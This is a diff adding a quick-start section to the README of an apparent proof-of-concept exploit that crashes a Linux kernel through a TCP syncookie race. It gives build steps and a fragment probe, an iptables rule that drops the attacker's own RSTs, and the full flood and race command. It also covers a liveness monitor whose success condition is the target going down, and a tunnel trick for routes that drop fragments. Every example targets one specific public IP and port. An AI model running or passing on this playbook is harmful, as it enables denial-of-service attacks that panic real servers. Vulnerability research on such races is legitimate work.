@@ -283,3 +283,110 @@ lab/monitor.sh        liveness monitor; timestamps the panic
   `tcp_check_req()` (`embryonic_reset`), `cookie_v4_check()`,
   `tcp_get_cookie_sock()`, `reqsk_alloc_noprof()` (`rsk_listener=NULL`),
   `tcp_request_sock_ops.slab_flags = SLAB_TYPESAFE_BY_RCU`.
+
+---
+
+## 11. Quick start against a routed target
+
+Everything below is run on the **attacker** host, as root (raw sockets). The
+target is reached through a gateway, so L2/L3 is auto-detected and ARP is not
+used.
+
+### 11.1 Clone and build
+
+```sh
+git clone git@github.com:nsvk13/NoisyTCP-PoC.git
+cd NoisyTCP-PoC
+./build.sh                      # falls back to nix-shell when no system gcc
+```
+
+`make` alone works too; `make selftest` builds and dumps sample frames.
+
+### 11.2 Probe first — decides whether the race is possible at all
+
+```sh
+sudo ./noisytcp --target 77.90.183.56 --port 25565 --probe
+```
+
+It sends a plain SYN batch plus three fragmented batches (8/32/40-byte first
+fragment) and prints:
+
+```
+[*] probe plain=5/5 frag8=5/5 frag32=5/5 frag40=5/5 from 77.90.183.56:25565
+```
+
+How to read it:
+
+| result | meaning |
+|---|---|
+| `plain=5 frag8=5` | path forwards fragments, race is viable |
+| `plain=5 frag8=0 frag32=0 frag40=0` | a hop drops all IP fragments (NAT/firewall/scrubber) — no L3/L4 queue split, race cannot fire from here |
+| `plain=5 frag8=0 frag32=5 frag40=5` | path inspects the L4 header and drops short first fragments — race still blocked |
+| `plain=0` | target down, filtered, or asymmetric return path |
+
+### 11.3 Stop the local kernel from resetting the tuples we race
+
+```sh
+sudo iptables -I OUTPUT -p tcp --tcp-flags RST RST \
+  -m multiport --sports 40000:40063 -j DROP
+```
+
+Range must cover `--base-sport .. --base-sport + --tuples - 1`.
+Remove it later with `sudo iptables -D OUTPUT ...` (same spec).
+
+### 11.4 Run
+
+```sh
+sudo ./noisytcp --target 77.90.183.56 --port 25565 \
+  --tuples 64 --race-threads 16 --race-pps 40000 \
+  --flood-threads 4 --flood-pps 30000 \
+  --pulse-ms 300 --burst 6 --pin --duration 0
+```
+
+- `--pulse-ms 0` is wrong for this trigger: the syn queue then never has room,
+  so no **hashed** `R_old` is ever created and there is nothing to free.
+  Keep a pulsed flood (200–400 ms).
+- `--pin` spreads workers over distinct CPUs (flood takes the tail cores).
+- Wait for `cookies=N/N` in the stats line; the race only fires once cookies
+  are captured.
+
+### 11.5 Tuning and expectation
+
+| target | expected time |
+|---|---|
+| VM with >=2 RX queues (virtio-net multiqueue) or RPS, busy host | 5 s – 2 min |
+| same VM, quiet host, little vCPU preemption | minutes |
+| bare metal | ~8–20 h (the advisory author measured ~14 h) |
+| fragment-dropping path | never |
+
+Confirm the target's side before a long grind (on the target itself):
+
+```sh
+ethtool -l eth0 | grep -A2 Combined        # want Combined >= 2
+cat /sys/class/net/eth0/queues/rx-0/rps_cpus
+sysctl net.ipv4.tcp_syncookies              # want 1
+```
+
+Watch liveness from the attacker while the PoC runs:
+
+```sh
+./lab/monitor.sh 77.90.183.56 25565
+```
+
+A sustained ping loss plus TCP connect failure == the target went down (panic).
+`TARGET DOWN` is the success condition; the PoC itself cannot observe the crash.
+
+### 11.6 If the probe says fragments are dropped
+
+The sender's position is wrong, not the flags. Two options:
+
+```sh
+# 1. run from a host already inside the same L3 domain as the target
+
+# 2. tunnel so the fragments are re-emitted past the fragment-eating hop
+sudo ip route add 77.90.183.56/32 dev wg0
+sudo ./noisytcp --target 77.90.183.56 --port 25565 --probe
+```
+
+Re-run the probe after the route change; `frag8=5/5` means the tunnel exit
+forwards fragments and the run can proceed.
